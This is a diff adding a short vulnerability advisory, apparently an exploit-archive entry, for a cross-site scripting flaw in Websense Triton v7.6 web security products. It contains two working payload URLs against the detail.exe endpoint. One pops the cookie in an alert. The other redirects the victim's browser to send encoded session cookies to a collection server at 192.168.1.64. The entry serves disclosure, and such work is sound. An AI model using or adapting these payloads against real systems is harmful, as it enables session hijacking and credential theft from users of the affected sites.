@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/51085/info
+
+Websense Triton is prone to a cross-site scripting vulnerability.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+This issue affects the following applications:
+
+Websense Web Security Gateway Anywhere v7.6
+Websense Web Security Gateway v7.6
+Websense Web Security v7.6
+Websense Web Filter v7.6 
+
+https://www.example.com/explorer_wse/detail.exe?c=cat&cat=153&anon=&startDate=2011-10-22&endDate=2011-10-22&session=a434cf98f3a402478599a71495a4a71e&dTitle=Internet_use_by_Category"><script>alert(document.cookie)</script>&section=1&uid=&col=1&cor=1&explorer=1&fork=1&puid=7360
+
+Send the current session-cookies to a credentials-collection server:
+
+https://www.example.com/explorer_wse/detail.exe?c=cat&cat=153&anon=&startDate=2011-10-22&endDate=2011-10-22&session=a434cf98f3a402478599a71495a4a71e&dTitle=Internet_use_by_Category"><script>document.location=unescape("http://192.168.1.64/"%2bencodeURIComponent(document.cookie))</script>&section=1&uid=&col=1&cor=1&explorer=1&fork=1&puid=7360
